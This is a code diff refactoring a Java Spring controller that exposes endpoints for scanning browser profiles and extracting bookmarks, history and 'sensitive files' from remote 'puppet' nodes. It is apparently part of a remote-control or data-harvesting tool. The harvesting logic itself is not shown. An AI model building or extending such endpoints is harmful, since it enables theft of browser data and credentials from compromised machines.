@@ -1,5 +1,6 @@
 package org.leo.web.controller.puppetnode.service;
 
+import org.leo.core.puppet.capability.BrowserDataCapable;
 import org.leo.web.util.ControllerUtil;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
@@ -17,22 +18,26 @@ public class BrowserDataController {
 
     @RequestMapping(value = "/scan-profiles", method = RequestMethod.POST)
     public HashMap<String, Object> scanProfiles(@RequestBody HashMap<String, Object> params) {
-        return ControllerUtil.handlePuppetCall(params, "扫描浏览器失败", node -> node.scanBrowserProfiles());
+        return ControllerUtil.handleCapabilityCall(params, BrowserDataCapable.class,
+                "扫描浏览器失败", BrowserDataCapable::scanBrowserProfiles);
     }
 
     @RequestMapping(value = "/bookmarks", method = RequestMethod.POST)
     public HashMap<String, Object> bookmarks(@RequestBody HashMap<String, Object> params) {
-        return ControllerUtil.handlePuppetCall(params, "提取书签失败", node -> node.extractBrowserBookmarks());
+        return ControllerUtil.handleCapabilityCall(params, BrowserDataCapable.class,
+                "提取书签失败", BrowserDataCapable::extractBrowserBookmarks);
     }
 
     @RequestMapping(value = "/history", method = RequestMethod.POST)
     public HashMap<String, Object> history(@RequestBody HashMap<String, Object> params) {
         int limit = ControllerUtil.getInt(params, "limit", 100);
-        return ControllerUtil.handlePuppetCall(params, "提取历史记录失败", node -> node.extractBrowserHistory(limit));
+        return ControllerUtil.handleCapabilityCall(params, BrowserDataCapable.class,
+                "提取历史记录失败", node -> node.extractBrowserHistory(limit));
     }
 
     @RequestMapping(value = "/sensitive-files", method = RequestMethod.POST)
     public HashMap<String, Object> sensitiveFiles(@RequestBody HashMap<String, Object> params) {
-        return ControllerUtil.handlePuppetCall(params, "列出敏感文件失败", node -> node.listBrowserSensitiveFiles());
+        return ControllerUtil.handleCapabilityCall(params, BrowserDataCapable.class,
+                "列出敏感文件失败", BrowserDataCapable::listBrowserSensitiveFiles);
     }
 }
